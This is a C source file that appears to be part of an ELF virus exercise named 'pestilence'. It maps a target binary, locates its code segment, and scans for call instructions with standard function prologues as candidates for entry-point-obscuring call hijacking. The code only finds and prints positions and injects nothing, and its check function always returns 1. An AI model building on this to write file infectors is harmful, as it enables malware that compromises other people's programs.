#include "pestilence.h"

void		init_info(t_info *info)
{
	info->text_begin = 0;
	info->text_size = 0;
}

void		find_text(t_info *info)
{
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	int32_t		i;
	size_t		base_entry;

	main_header = (Elf64_Ehdr *)(info->file);
	base_entry = main_header->e_entry;
	i = 0;
	header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			info->text_begin = header->p_offset + info->file;
			info->text_size = header->p_filesz;
		}
		header++;
		i++;
	}
}

int			valid_call(t_info *info, int pos)
{
	int32_t		dest;
	uint32_t	prolog;

	dest = *((int32_t *)(info->text_begin + pos));
	if ((dest + pos + 4 < 0) || ((size_t)(dest + pos + 4) > info->text_size))
		return (1);
	prolog = *((int32_t *)(info->text_begin + dest + pos + 4));
	if (prolog == 0xe5894855)
		dprintf(1, "pos : %d\n", pos - 1);
	return (1);
}

void		*epo_parsing(t_info *info)
{
	size_t	i;
	uint8_t	c;

	i = 0;
	while (i < info->text_size)
	{
		c = *((uint8_t *)(info->text_begin + i));
		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
			return (info->file + i);
		i++;
	}
	return (info->file);
}

int main(int argc, char **argv)
{
	if (argc != 2)
		return (dprintf(1, "usage : 2 arg\n"));
	struct stat		st;
	int				fd = open(argv[1], O_RDWR);
	t_info			info;
	

	init_info(&info);
	fstat(fd, &st);
	info.file_size = st.st_size;
	info.file = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	find_text(&info);
	info.call_to_replace = epo_parsing(&info);


	return (0);
}
